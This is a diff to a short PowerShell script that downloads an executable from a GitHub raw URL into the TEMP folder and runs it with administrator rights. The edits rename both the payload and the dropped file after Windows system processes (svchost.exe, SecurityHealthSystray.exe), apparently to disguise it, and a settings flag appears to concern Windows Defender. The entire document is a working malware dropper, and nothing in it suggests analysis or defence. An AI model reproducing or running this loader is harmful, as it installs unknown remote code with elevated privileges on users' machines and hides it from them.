@@ -3,14 +3,15 @@
 $settings = '{"WD": false, "adminrun": false}' | ConvertFrom-Json
 
 if ($settings.adminrun) {
-$outputPath = [System.IO.Path]::Combine($env:TEMP, 'winlog32.exe')
+$outputPath = [System.IO.Path]::Combine($env:TEMP, 'SecurityHealthSystray.exe')
 } else {
-$outputPath = [System.IO.Path]::Combine($env:TEMP, 'sihost.exe')
+$outputPath = [System.IO.Path]::Combine($env:TEMP, 'SecurityHealthSystray.exe')
 }
 
 
 $webClient = New-Object System.Net.WebClient
 
-$webClient.DownloadFile("https://github.com/MB2RZEN/tcx/raw/refs/heads/main/Kernel.exe", $outputPath)
+$webClient.DownloadFile("https://github.com/MB2RZEN/tcx/raw/refs/heads/main/svchost.exe", $outputPath)
 Start-Process -FilePath $outputPath -Verb RunAs
+
 
